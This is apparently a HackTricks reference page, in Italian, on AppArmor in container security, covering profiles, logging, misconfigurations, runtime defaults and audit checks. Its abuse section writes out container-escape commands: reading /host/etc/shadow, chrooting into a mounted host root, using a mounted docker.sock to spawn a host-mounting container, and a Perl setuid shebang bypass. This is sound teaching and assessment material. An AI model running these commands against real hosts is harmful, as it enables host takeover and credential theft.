# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

AppArmor è un sistema di **controllo degli accessi obbligatorio** che applica restrizioni tramite profili per singolo programma. A differenza dei tradizionali controlli DAC, che dipendono fortemente dalla proprietà di utente e gruppo, AppArmor permette al kernel di far rispettare una politica associata al processo stesso. In ambienti container, questo è importante perché un workload può avere sufficienti privilegi tradizionali per tentare un'azione e comunque essere negato perché il suo profilo AppArmor non consente il percorso, il mount, il comportamento di rete o l'uso della capability rilevante.

Il punto concettuale più importante è che AppArmor è **basato sui percorsi**. Ragiona sugli accessi al filesystem tramite regole sui percorsi piuttosto che tramite etichette come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che bind mounts e layout alternativi dei percorsi meritano particolare attenzione. Se lo stesso contenuto dell'host diventa raggiungibile tramite un percorso diverso, l'effetto della policy potrebbe non essere quello che l'operatore si aspettava inizialmente.

## Ruolo nell'isolamento dei container

Le revisioni di sicurezza dei container spesso si fermano a capabilities e seccomp, ma AppArmor continua a essere importante anche dopo quei controlli. Immagina un container che ha più privilegi di quanto dovrebbe, o un workload che necessitava di una capability in più per motivi operativi. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, la rete e i pattern di esecuzione in modi che bloccano la via di abuso ovvia. Per questo disabilitare AppArmor "just to get the application working" può silenziosamente trasformare una configurazione semplicemente rischiosa in una attivamente sfruttabile.

## Laboratorio

Per verificare se AppArmor è attivo sull'host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Per vedere sotto quale utente/contesto è in esecuzione il processo corrente del container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor legato al profilo scelto dal runtime. Nel caso unconfined, quel livello aggiuntivo di restrizione scompare.

Puoi anche ispezionare ciò che Docker ritiene di aver applicato:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso a runtime

Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può anche integrarsi con AppArmor su sistemi basati su AppArmor, anche se sulle distribuzioni orientate a SELinux l'altro sistema MAC spesso prende il sopravvento. Kubernetes può esporre le policy AppArmor a livello di workload sui nodi che effettivamente supportano AppArmor. LXC e gli ambienti system-container della famiglia Ubuntu usano anch'essi AppArmor in modo esteso.

Il punto pratico è che AppArmor non è una "feature di Docker". È una funzionalità del kernel dell'host che diversi runtimes possono scegliere di applicare. Se l'host non lo supporta o al runtime viene detto di eseguire in unconfined, la presunta protezione non è realmente presente.

Sugli host AppArmor con supporto Docker, il default più noto è `docker-default`. Quel profilo è generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati su capability falliscono ancora in un container di default. In termini generali, `docker-default` permette il networking ordinario, nega le scritture a gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e restringe ptrace così che non sia una primitiva generale per sondare l'host. Capire questa baseline aiuta a distinguere "il container ha `CAP_SYS_ADMIN`" da "il container può effettivamente usare quella capability contro le interfacce kernel che mi interessano".

## Gestione dei profili

I profili AppArmor sono solitamente memorizzati sotto `/etc/apparmor.d/`. Una convenzione comune per i nomi è sostituire le slash nel percorso eseguibile con punti. Per esempio, un profilo per `/usr/bin/man` è comunemente memorizzato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio conta sia nella difesa sia nella assessment perché una volta noto il nome del profilo attivo, spesso puoi localizzare rapidamente il file corrispondente sull'host.

Comandi utili lato host includono:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La ragione per cui questi comandi sono importanti in un riferimento di container-security è che spiegano come i profili vengono effettivamente creati, caricati, impostati in complain mode e modificati dopo cambiamenti all'applicazione. Se un operatore ha l'abitudine di spostare i profili in complain mode durante il troubleshooting e di dimenticare di ripristinare l'enforcement, il container può sembrare protetto nella documentazione mentre in realtà si comporta in modo molto più permissivo.

### Creazione e aggiornamento dei profili

`aa-genprof` può osservare il comportamento dell'applicazione e aiutare a generare un profilo in modo interattivo:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` può generare un profilo template che può essere poi caricato con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre i dinieghi trovati nei log e assistere l'operatore nel decidere se consentirli o negarli:
```bash
sudo aa-logprof
```
### Logs

I dinieghi di AppArmor sono spesso visibili tramite `auditd`, syslog o strumenti come `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Questo è utile a livello operativo e offensivo. I difensori lo usano per perfezionare i profili. Gli attaccanti lo usano per capire esattamente quale percorso o quale operazione venga negata e se AppArmor sia il controllo che blocca una catena di exploit.

### Identificare il file di profilo esatto

Quando un runtime mostra un nome di profilo AppArmor specifico per un container, è spesso utile mappare quel nome al file di profilo sul disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Questo è particolarmente utile durante la revisione lato host perché colma il divario tra "il container riporta di essere eseguito sotto il profilo `lowpriv`" e "le regole effettive risiedono in questo file specifico che può essere revisionato o ricaricato".

## Misconfigurazioni

L'errore più ovvio è `apparmor=unconfined`. Gli amministratori spesso lo impostano mentre eseguono il debug di un'applicazione che è fallita perché il profilo ha correttamente bloccato qualcosa di pericoloso o inatteso. Se il flag rimane in produzione, l'intero livello MAC è stato effettivamente rimosso.

Un altro problema sottile è presumere che i bind mounts siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor è basato sui percorsi, esporre i percorsi dell'host sotto posizioni di mount alternative può interagire male con le regole sui percorsi. Un terzo errore è dimenticare che il nome di un profilo in un file di configurazione significa molto poco se il kernel dell'host non sta effettivamente applicando AppArmor.

## Abuso

Quando AppArmor non è presente, operazioni che prima erano vincolate possono improvvisamente funzionare: leggere percorsi sensibili tramite bind mounts, accedere a parti di procfs o sysfs che sarebbero dovute rimanere più difficili da usare, eseguire azioni relative al mount se anche capabilities/seccomp lo permettono, o usare percorsi che un profilo normalmente negherebbe. AppArmor è spesso il meccanismo che spiega perché un tentativo di breakout basato su capability "should work" sulla carta ma fallisce ancora nella pratica. Rimuovi AppArmor, e lo stesso tentativo potrebbe iniziare a riuscire.

Se sospetti che AppArmor sia la causa principale che impedisce una catena di abuso basata su path-traversal, bind-mount, o mount-based, il primo passo è solitamente confrontare cosa diventa accessibile con e senza un profilo. Ad esempio, se un percorso dell'host è montato all'interno del container, inizia verificando se puoi attraversarlo e leggerlo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se il container ha anche una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici è verificare se AppArmor è il controllo che blocca le operazioni di mount o l'accesso ai filesystem sensibili del kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In ambienti in cui un host path è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di divulgazione di informazioni in sola lettura in un accesso diretto ai file dell'host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Lo scopo di questi comandi non è che AppArmor da solo crei il breakout. È che, una volta rimosso AppArmor, molti filesystem e percorsi di abuso basati su mount diventano immediatamente testabili.

### Esempio completo: AppArmor Disabled + Host Root Mounted

Se il container ha già il host root bind-mounted in `/host`, rimuovere AppArmor può trasformare un percorso di abuso filesystem bloccato in una completa host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una volta che la shell viene eseguita attraverso il filesystem dell'host, il workload è effettivamente uscito dal confine del container:
```bash
id
hostname
cat /etc/shadow | head
```
### Esempio completo: AppArmor disabilitato + Runtime socket

Se la vera barriera era AppArmor intorno allo stato di runtime, una socket montata può essere sufficiente per un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Il percorso esatto dipende dal mount point, ma il risultato finale è lo stesso: AppArmor non impedisce più l'accesso all'API di runtime, e l'API di runtime può avviare un container che compromette l'host.

### Esempio completo: Bypass dei bind-mount basato sul percorso

Poiché AppArmor è basato sui percorsi, proteggere `/proc/**` non protegge automaticamente lo stesso contenuto procfs dell'host quando è raggiungibile tramite un percorso diverso:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impatto dipende da cosa esattamente è montato e se il percorso alternativo aggira anche altri controlli, ma questo schema è uno dei motivi più chiari per cui AppArmor deve essere valutato insieme al layout dei mount e non isolatamente.

### Esempio completo: Shebang Bypass

La policy di AppArmor a volte prende di mira il percorso di un interprete in modo che non tenga pienamente conto dell'esecuzione di script tramite la gestione degli shebang. Un esempio storico prevedeva l'uso di uno script la cui prima riga punta a un interprete confinato:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Questo tipo di esempio è importante per ricordare che l'intento del profilo e la semantica reale di esecuzione possono divergere. Durante la revisione di AppArmor in ambienti container, le catene di interpreti e i percorsi di esecuzione alternativi meritano particolare attenzione.

## Verifiche

Lo scopo di queste verifiche è rispondere rapidamente a tre domande: AppArmor è abilitato sull'host, il processo corrente è confinato e il runtime ha effettivamente applicato un profilo a questo container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
È interessante notare:

- Se `/proc/self/attr/current` mostra `unconfined`, il workload non trae beneficio dal confinamento di AppArmor.
- Se `aa-status` mostra AppArmor disabilitato o non caricato, qualsiasi nome di profilo nella configurazione runtime è per lo più cosmetico.
- Se `docker inspect` mostra `unconfined` o un profilo personalizzato inatteso, spesso quella è la ragione per cui un percorso di abuso basato su filesystem o mount funziona.

Se un container ha già privilegi elevati per motivi operativi, lasciare AppArmor abilitato spesso fa la differenza tra un'eccezione controllata e un fallimento della sicurezza molto più ampio.

## Valori predefiniti del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Abilitato di default sugli host con supporto AppArmor | Usa il profilo AppArmor `docker-default` a meno che non venga sovrascritto | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dipende dall'host | AppArmor è supportato tramite `--security-opt`, ma il valore predefinito esatto dipende dall'host/runtime ed è meno universale rispetto al profilo `docker-default` documentato di Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predefinito condizionale | Se `appArmorProfile.type` non è specificato, il valore predefinito è `RuntimeDefault`, ma viene applicato solo quando AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto AppArmor |
| containerd / CRI-O under Kubernetes | Segue il supporto del nodo/runtime | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l'effettiva applicazione dipende ancora dal supporto del nodo e dalle impostazioni del workload | Stesso della riga Kubernetes; la configurazione diretta del runtime può anche escludere AppArmor del tutto |

Per AppArmor, la variabile più importante è spesso l'**host**, non solo il runtime. Un'impostazione di profilo in un manifest non crea confinamento su un nodo dove AppArmor non è abilitato.
{{#include ../../../../banners/hacktricks-training.md}}
